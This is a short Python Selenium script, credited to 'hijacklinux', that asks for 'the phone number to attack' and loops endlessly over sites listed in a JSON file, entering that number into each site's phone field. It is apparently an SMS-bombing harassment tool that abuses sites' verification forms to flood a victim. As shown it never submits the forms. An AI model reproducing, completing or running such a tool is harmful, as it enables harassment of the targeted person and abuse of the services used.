#!/usr/bin/env python
#-*- coding:utf-8 -*-
from selenium import webdriver
import time
import json
browser=webdriver.Firefox()

def attack(telnum,url,telxpath):
    browser.delete_all_cookies()
    browser.get(url)
    time.sleep(1)
    #print(user)
    #print(passwd )
    browser.find_element_by_xpath(telxpath).click()
    browser.find_element_by_xpath(telxpath).clear()
    browser.find_element_by_xpath(telxpath).send_keys(telnum)
    time.sleep(10)


if __name__=="__main__":
    print('作者：hijacklinux')
    telnum = input("请输入要攻击手机号：")
    while True:
        with open('tele_sites.json','r') as f:
            sites=json.load(f)    #读取json格式文件
            for site in sites:
                url = site["url"]
                telxpath = site["telxpath"]
                attack(telnum,url,telxpath)






